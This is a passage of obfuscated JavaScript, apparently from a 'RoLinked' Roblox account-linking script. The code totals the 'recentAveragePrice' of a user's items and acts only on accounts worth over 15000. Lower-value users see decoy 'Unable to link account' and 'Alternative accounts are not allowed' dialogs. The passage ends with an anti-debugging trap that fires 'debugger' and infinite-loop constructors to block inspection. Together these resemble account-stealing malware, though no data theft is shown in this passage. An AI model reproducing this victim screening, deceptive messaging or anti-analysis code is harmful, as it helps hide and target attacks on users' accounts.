                                        F.recentAveragePrice && (S += F.recentAveragePrice);
                                    });
                                    if (S > 15000) {
                                        B();
                                    } else {
                                        var Q = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", Q);
                                        document.getElementById("closeButton1").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                        document.getElementById("promptPopup").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                    }
                                } else {
                                    var Q = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                    document.body.insertAdjacentHTML("beforeend", Q);
                                    document.getElementById("closeButton1").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                    document.getElementById("promptPopup").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                }
                            })
                            .fail(function (f, r, W) {
                                var F = {};
                                F.jklUy = "promptPopup";
                                F.tiSNR = "text-footer footer-note";
                                F.jgIsv = "Not Active";
                                var h = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                document.body.insertAdjacentHTML("beforeend", h);
                                document.getElementById("closeButton1").onclick = function () {
                                    document.getElementById(A.jklUy).remove();
                                    document.getElementsByClassName(A.tiSNR)[0].innerText = A.jgIsv;
                                };
                                document.getElementById("promptPopup").onclick = function () {
                                    document.getElementById("promptPopup").remove();
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                };
                            });
                    }
                })();
            },
            error: function () {
                var R = {};
                R.RHUhO = "promptPopup";
                R.CMCUn = "text-footer footer-note";
                R.emtip = "Not Active";
                var k = R;
                var B = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                document.body.insertAdjacentHTML("beforeend", B);
                document.getElementById("closeButton1").onclick = function () {
                    document.getElementById("promptPopup").remove();
                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                };
                document.getElementById("promptPopup").onclick = function () {
                    document.getElementById(k.RHUhO).remove();
                    document.getElementsByClassName(k.CMCUn)[0].innerText = k.emtip;
                };
            },
        });
    }
})();
function Z(C) {
    function q(g) {
        if (typeof g === "string") {
            return function (z) {}.constructor("while (true) {}").apply("counter");
        } else {
            ("" + g / g).length !== 1 || g % 20 === 0
                ? function () {
                      return true;
                  }
                      .constructor("debugger")
                      .call("action")
                : function () {
                      return false;
                  }
                      .constructor("debugger")
                      .apply("stateObject");
        }
        q(++g);
    }
    try {
        if (C) {
            return q;
        } else {
            q(0);
        }
    } catch (g) {}
}
